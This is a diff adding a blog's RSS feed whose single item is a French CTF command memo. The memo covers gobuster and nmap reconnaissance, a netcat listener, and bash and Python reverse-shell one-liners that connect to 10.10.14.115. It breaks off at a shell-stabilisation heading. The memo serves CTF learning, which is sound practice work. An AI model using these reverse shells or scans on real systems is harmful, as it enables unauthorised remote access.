@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Ctf on Wanako Blog</title>
+    <link>http://localhost:1313/tags/ctf/</link>
+    <description>Recent content in Ctf on Wanako Blog</description>
+    <image>
+      <title>Wanako Blog</title>
+      <url>http://localhost:1313/images/avatar.png</url>
+      <link>http://localhost:1313/images/avatar.png</link>
+    </image>
+    <generator>Hugo -- 0.151.0</generator>
+    <language>en</language>
+    <lastBuildDate>Mon, 01 Jan 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Mémo Commandes CTF</title>
+      <link>http://localhost:1313/projets/memo_cmd/</link>
+      <pubDate>Mon, 01 Jan 2024 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/projets/memo_cmd/</guid>
+      <description>&lt;h2 id=&#34;-infrastructure&#34;&gt;📁 Infrastructure&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ctf/
+├── 02_challenges/
+└── 03_tools/
+    └── SecLists/
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h2 id=&#34;-reconnaissance&#34;&gt;🔍 Reconnaissance&lt;/h2&gt;
+&lt;h3 id=&#34;gobuster---énumération-de-répertoires&#34;&gt;Gobuster - Énumération de répertoires&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Recherche de dossiers et fichiers web&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gobuster dir -w directory-list-2.3-small.txt -u http://url/ -x php,html,js
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dir&lt;/code&gt; : mode énumération de répertoires&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-w&lt;/code&gt; : wordlist à utiliser&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; : URL cible&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; : extensions de fichiers à tester&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;gobuster---énumération-de-vhosts&#34;&gt;Gobuster - Énumération de vhosts&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Recherche de sous-domaines virtuels&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gobuster vhost -w ~/ctf/03_tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;               -u http://url &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;               --append-domain
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;vhost&lt;/code&gt; : mode virtual host&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--append-domain&lt;/code&gt; : ajoute le domaine de base aux sous-domaines testés&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;nmap---scan-de-ports&#34;&gt;Nmap - Scan de ports&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Scan complet avec détection de services&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -A url
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Scan avancé sans ping&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -Pn -sV -sS -sC -O url
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-A&lt;/code&gt; : détection OS, version, scripts, traceroute&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-Pn&lt;/code&gt; : pas de ping (utile si firewall)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-sV&lt;/code&gt; : détection de version des services&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-sS&lt;/code&gt; : SYN scan (furtif)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-sC&lt;/code&gt; : scripts par défaut&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-O&lt;/code&gt; : détection de l&amp;rsquo;OS&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;-exploitation&#34;&gt;💣 Exploitation&lt;/h2&gt;
+&lt;h3 id=&#34;netcat---listener&#34;&gt;Netcat - Listener&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Écoute pour reverse shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lvnp &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; : mode écoute (listen)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; : mode verbeux&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-n&lt;/code&gt; : pas de résolution DNS&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; : port d&amp;rsquo;écoute&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;reverse-shell---bash&#34;&gt;Reverse Shell - Bash&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.115/4444 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-i&lt;/code&gt; : shell interactif&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;gt;&amp;amp;&lt;/code&gt; : redirige stdout et stderr&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0&amp;gt;&amp;amp;1&lt;/code&gt; : redirige stdin vers stdout&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;reverse-shell---python&#34;&gt;Reverse Shell - Python&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;RHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;10.10.14.115&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;RPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9001&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&amp;#34;RHOST&amp;#34;),int(os.getenv(&amp;#34;RPORT&amp;#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;#34;sh&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;pty.spawn()&lt;/code&gt; : spawne un pseudo-terminal&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;os.dup2()&lt;/code&gt; : duplique les descripteurs de fichiers&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;stabilisation-du-shell&#34;&gt;Stabilisation du Shell&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Méthode Python :&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
